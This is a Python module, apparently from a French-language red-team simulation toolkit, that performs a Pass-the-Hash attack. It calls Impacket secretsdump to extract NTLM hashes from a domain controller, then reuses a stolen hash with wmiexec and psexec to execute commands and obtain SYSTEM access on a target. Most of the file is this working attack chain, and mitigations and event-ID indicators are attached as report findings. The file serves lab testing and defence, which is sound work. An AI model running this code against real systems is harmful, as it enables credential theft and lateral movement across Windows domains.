"""
Red Team — Pass-the-Hash (PtH) simulation.
Utilise un hash NTLM volé pour s'authentifier sans connaître le mot de passe en clair.

⚠ Lab isolé uniquement.
"""

import subprocess
import re
import os
from datetime import datetime

from utils.format_utils import print_info, print_warning, print_success, print_error

ATTACK_META = {
    "name":      "Pass-the-Hash",
    "phase":     "Privilege Escalation / Lateral Movement",
    "mitre":     "T1550.002",
    "risk":      "Critique",
    "event_ids": [4624, 4625, 4648],
    "tools":     ["Impacket (psexec/wmiexec)", "CrackMapExec", "Mimikatz"],
}


def run_attack(target: str = "192.168.56.11", domain: str = "domain.local",
               user: str = "Administrator",
               ntlm_hash: str = None,
               dump_hashes: bool = True,
               **kwargs) -> dict:
    """
    Pass-the-Hash simulation:
    1. (Optionnel) Extraire des hashes NTLM via secretsdump
    2. Réutiliser le hash pour s'authentifier sur la cible
    3. Tenter d'obtenir un shell / accès distant
    """
    print_warning(f"[RED TEAM] Pass-the-Hash → {target} (user: {user})")

    findings = []
    hashes   = {}
    access   = []

    # Step 1: Dump hashes if not provided
    if ntlm_hash is None and dump_hashes:
        print_info("Extraction des hashes NTLM depuis le DC (secretsdump)...")
        hashes = _secretsdump(domain, target)
        if hashes:
            ntlm_hash = next(iter(hashes.values()))  # Use first found hash
            findings.append({
                "risk":        "Critique",
                "title":       f"{len(hashes)} hash(es) NTLM extrait(s) du DC",
                "description": (
                    f"Comptes : {', '.join(list(hashes.keys())[:8])}. "
                    "Ces hashes permettent une authentification directe sans mot de passe clair."
                ),
                "mitigation":  (
                    "1. Activer Protected Users Security Group.\n"
                    "2. Désactiver NTLMv1 via GPO.\n"
                    "3. Implémenter LAPS (Local Admin Password Solution).\n"
                    "4. Restreindre les droits de replication AD."
                ),
                "event_ids": [4662],
            })
        else:
            findings.append({
                "risk":        "Info",
                "title":       "Extraction de hashes impossible — droits insuffisants",
                "description": "secretsdump nécessite des droits Domain Admin ou replication.",
                "mitigation":  "Surveiller l'Event ID 4662 (DCSync) et les accès DRSUAPI.",
                "event_ids":   [4662],
            })

    if not ntlm_hash:
        findings.append({
            "risk":        "Info",
            "title":       "PtH non exécuté — aucun hash disponible",
            "description": "Fournir un hash NTLM via --ntlm-hash ou activer dump_hashes.",
            "mitigation":  "N/A",
            "event_ids":   [],
        })
        return _build_result("partial", findings, hashes, access)

    # Step 2: Authenticate using the hash
    print_info(f"Tentative PtH avec {user}:{ntlm_hash[:16]}…")

    # Try wmiexec (stealthier)
    wmi_result = _pth_wmiexec(target, domain, user, ntlm_hash)
    if wmi_result:
        access.append({"method": "WMI", "target": target, "user": user})
        findings.append({
            "risk":        "Critique",
            "title":       f"Accès WMI obtenu via PtH sur {target}",
            "description": (
                f"Commande exécutée sur {target} en tant que {user} "
                "sans connaître le mot de passe en clair. "
                f"Résultat : {wmi_result[:200]}"
            ),
            "mitigation":  (
                "1. Désactiver l'authentification NTLM (forcer Kerberos).\n"
                "2. Activer le credential guard (Windows Defender Credential Guard).\n"
                "3. Bloquer WMI distant via pare-feu (port TCP 135 + dynamique).\n"
                "4. Utiliser LAPS pour des mots de passe locaux uniques."
            ),
            "event_ids": [4624, 4648],
        })

    # Try psexec (louder but reliable)
    psexec_result = _pth_psexec(target, domain, user, ntlm_hash)
    if psexec_result:
        access.append({"method": "PsExec", "target": target, "user": user})
        findings.append({
            "risk":        "Critique",
            "title":       f"Shell SYSTEM obtenu via PsExec+PtH sur {target}",
            "description": (
                f"Accès SYSTEM obtenu sur {target} via Pass-the-Hash + PsExec. "
                "Escalade vers SYSTEM depuis le hash d'Administrator."
            ),
            "mitigation":  (
                "1. Désactiver l'accès ADMIN$ et IPC$ via GPO.\n"
                "2. Restreindre les partages administratifs (AutoShareServer=0).\n"
                "3. Monitorer Event ID 4624 type logon 3 + compte Administrator."
            ),
            "event_ids": [4624, 7045],
        })

    if not access:
        findings.append({
            "risk":        "Moyen",
            "title":       "PtH tenté mais accès refusé sur la cible",
            "description": (
                "L'authentification avec le hash a échoué. "
                "Possible protection : Credential Guard, NTLM restrictions, ou pare-feu."
            ),
            "mitigation":  "Bonne pratique — documenter et maintenir ces protections.",
            "event_ids":   [4625],
        })

    return _build_result("success", findings, hashes, access)


# ── Private ───────────────────────────────────────────────────────────────────

def _secretsdump(domain: str, target: str) -> dict:
    """Extract NTLM hashes via impacket secretsdump."""
    hashes = {}
    try:
        result = subprocess.run(
            [
                "python3", "-m", "impacket.examples.secretsdump",
                "-just-dc-ntlm",
                f"{domain}/administrator@{target}",
                "-no-pass",
            ],
            capture_output=True, text=True, timeout=60
        )
        # Parse format: domain\user:rid:LM:NTLM:::
        for line in result.stdout.splitlines():
            m = re.match(r"[\w.]+\\(\w+):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::", line)
            if m:
                hashes[m.group(1)] = m.group(2)
    except Exception:
        pass
    return hashes


def _pth_wmiexec(target: str, domain: str, user: str, ntlm_hash: str) -> str | None:
    """Attempt remote WMI execution via PtH."""
    lm_part   = "aad3b435b51404eeaad3b435b51404ee"
    full_hash = f"{lm_part}:{ntlm_hash}" if ":" not in ntlm_hash else ntlm_hash
    try:
        result = subprocess.run(
            [
                "python3", "-m", "impacket.examples.wmiexec",
                f"{domain}/{user}@{target}",
                "-hashes", full_hash,
                "whoami /all",
            ],
            capture_output=True, text=True, timeout=20
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except Exception:
        pass
    return None


def _pth_psexec(target: str, domain: str, user: str, ntlm_hash: str) -> str | None:
    """Attempt PsExec via PtH."""
    lm_part   = "aad3b435b51404eeaad3b435b51404ee"
    full_hash = f"{lm_part}:{ntlm_hash}" if ":" not in ntlm_hash else ntlm_hash
    try:
        result = subprocess.run(
            [
                "python3", "-m", "impacket.examples.psexec",
                f"{domain}/{user}@{target}",
                "-hashes", full_hash,
                "whoami",
            ],
            capture_output=True, text=True, timeout=20
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except Exception:
        pass
    return None


def _build_result(status: str, findings: list, hashes: dict, access: list) -> dict:
    return {
        "module":      "red_team.pth",
        "status":      status,
        "timestamp":   datetime.now().isoformat(),
        "attack_meta": ATTACK_META,
        "findings":    findings,
        "artifacts": {
            "ntlm_hashes":    hashes,
            "access_obtained": access,
        },
        "iocs": [
            {"type": "event_id", "value": 4624,
             "description": "Logon type 3 avec compte Admin — surveiller l'origine"},
            {"type": "event_id", "value": 4648,
             "description": "Logon avec credentials explicites (PtH pattern)"},
        ],
        "summary": {
            "hashes_dumped":  len(hashes),
            "access_obtained": len(access),
            "methods":        [a["method"] for a in access],
        },
    }
